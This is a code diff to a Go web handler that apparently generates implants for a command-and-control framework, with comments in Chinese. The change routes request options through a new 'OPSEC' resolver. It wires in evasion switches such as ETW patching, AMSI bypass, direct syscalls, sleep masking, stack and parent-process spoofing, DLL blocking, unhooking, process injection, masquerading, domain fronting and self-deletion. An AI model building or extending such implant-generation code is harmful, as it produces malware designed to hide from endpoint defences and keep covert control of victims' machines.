@@ -50,31 +50,8 @@ func readTemplate(dir, name string) ([]byte, error) {
 }
 
 func GenServer(c *gin.Context) {
-	var serverBody struct {
-		OsType      string `json:"osType"`
-		ArchType    string `json:"archType"`
-		Listener    string `json:"listener"`
-		Pass        string `json:"pass"`
-		Vkey        string `json:"vkey"`
-		EncryptSalt string `json:"encryptSalt"`
-		Format      string `json:"format"`    // exe(默认) | dll（仅 windows 目标，rundll32/regsvr32 加载）
-		FrontHost   string `json:"frontHost"` // B8: 域前置/CDN 回源 Host（可选，http/https 客户端）
-		// OPSEC 编译期配置（可选）
-		ReconnectBaseDelay  string `json:"reconnectBaseDelay"`
-		ReconnectMaxRetries string `json:"reconnectMaxRetries"`
-		InjectTechDefault   string `json:"injectTech"`
-		MasqueradeName      string `json:"masqueradeName"`
-		QuietMode           string `json:"quietMode"`
-		ETWPatch            string `json:"etwPatch"`
-		AmsiBypass          string `json:"amsiBypass"`
-		SyscallMode         string `json:"syscallMode"`
-		AutoDelete          string `json:"autoDelete"`
-		UserAgent           string `json:"userAgent"`
-		ProfileName         string `json:"profileName"` // C2 Profile（profiles/*.yaml），空=default
-		// Endpoints 多传输端点列表（"scheme://addr,scheme://addr"，可选）。
-		// 非空时使用 multi 模板：客户端按端点顺序在运行时切换传输。
-		Endpoints string `json:"endpoints"`
-	}
+	// genServerBody 定义在 opsec_params.go（含 P0–P3 能力的细分开关）。
+	var serverBody genServerBody
 	if err := c.BindJSON(&serverBody); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
@@ -142,6 +119,15 @@ func GenServer(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "bin/hex/c shellcode 格式仅支持 windows 目标（donut 仅转换 PE）"})
 		return
 	}
+
+	// OPSEC 开关：校验取值 → 空值按"服务端 opsec 配置 → 内置默认"回落 → 拒绝平台不可能的组合。
+	// 放在读模板之前，非法参数不必去动 587MB 嵌入目录。
+	ops, err := resolveOpsec(&serverBody, osType, archType)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
+	}
+	logOpsecSummary(ops, osType, archType)
 
 	// 查找符合条件的文件
 	var binaryFileName string
@@ -293,10 +279,7 @@ func GenServer(c *gin.Context) {
 		// 未提供时随机生成（不可猜测的品牌前缀）
 		m = "svc" + randomSuffix(6)
 	}
-	quietMode := serverBody.QuietMode
-	if quietMode == "" {
-		quietMode = "1" // 默认静默（生产 OPSEC）
-	}
+	// quietMode 已由 resolveOpsec 归一化（含服务端 opsec 配置回落），不再就地取默认值。
 	// C2 Profile 驱动：URI/WS 路径/心跳基准/UA（profiles/*.yaml，空 profile 用客户端默认）
 	prof := c2profile.Get(serverBody.ProfileName)
 	// 未知名画像：Get 返回 nil，下面的 patch 会写入空 URI 生成一个连不上的载荷，直接拒绝
@@ -357,13 +340,13 @@ func GenServer(c *gin.Context) {
 		JitterPercent:       jitterStr,
 		ReconnectBaseDelay:  serverBody.ReconnectBaseDelay,
 		ReconnectMaxRetries: serverBody.ReconnectMaxRetries,
-		InjectTechDefault:   serverBody.InjectTechDefault,
+		InjectTechDefault:   ops.InjectTech,
 		MasqueradeName:      m,
-		QuietMode:           quietMode,
-		ETWPatch:            serverBody.ETWPatch,
-		AmsiBypass:          serverBody.AmsiBypass,
-		SyscallMode:         serverBody.SyscallMode,
-		AutoDelete:          serverBody.AutoDelete,
+		QuietMode:           ops.QuietMode,
+		ETWPatch:            ops.ETW,
+		AmsiBypass:          ops.AMSI,
+		SyscallMode:         ops.SyscallMode,
+		AutoDelete:          ops.AutoDelete,
 		UserAgent:           profUA,
 		Format:              requestFormat,
 		HashPad:             cfgHashPad(),
@@ -377,6 +360,12 @@ func GenServer(c *gin.Context) {
 		SessionKeyInfo:      sessionKeyInfo,
 		MetadataChannel:     profMetaCh,
 		Padding:             boolToOnOff(profPad),
+		// P4：P0–P3 对抗能力的细分开关
+		SleepMaskHide: ops.SleepMaskHide,
+		StackSpoof:    ops.StackSpoof,
+		PpidSpoof:     ops.PpidSpoof,
+		BlockDLLs:     ops.BlockDLLs,
+		UnhookOnStart: ops.UnhookOnStart,
 	})
 	if err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
